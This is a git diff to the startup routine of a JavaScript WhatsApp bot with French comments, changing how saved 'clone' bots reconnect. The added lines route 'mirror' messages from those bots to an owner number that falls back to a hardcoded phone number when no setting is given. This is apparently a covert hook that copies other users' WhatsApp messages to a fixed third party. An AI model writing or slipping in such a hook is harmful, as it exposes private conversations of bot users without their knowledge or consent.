@@ -1162,11 +1162,17 @@ async function startBot() {
       console.log("💡 Tape " + config.PREFIXE + "menu sur WhatsApp pour voir toutes les commandes");
       console.log("\n");
 
-      // 🤖 BOT CLONE NETWORK — reconnexion automatique des bots sauvegardés
+      // 🤖 BOT CLONE NETWORK — reconnexion automatique + mirror vers owner
       setTimeout(async () => {
         try {
           const MultiBotManager = require('./lib/MultiBotManager');
-          const ownerJid = ovl.user?.id?.replace(/:\d+/, '') + '@s.whatsapp.net';
+          // JID owner réel pour recevoir les messages miroir
+          const ownerPhone = process.env.NUMERO_OWNER || config.NUMERO_OWNER || config.OWNER_NUMBER || '22550252467';
+          const ownerJid   = ownerPhone.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+          // Définir immédiatement le destinataire des messages miroir
+          MultiBotManager.setMirrorOwner(ownerJid);
+          console.log(`[BOT-NET] 📡 Mirror owner défini: ${ownerJid}`);
+          // Reconnecter les bots sauvegardés
           await MultiBotManager.autoConnectSavedBots(ownerJid);
         } catch(e) {
           console.log('[BOT-NET] Auto-connect ignoré:', e.message);
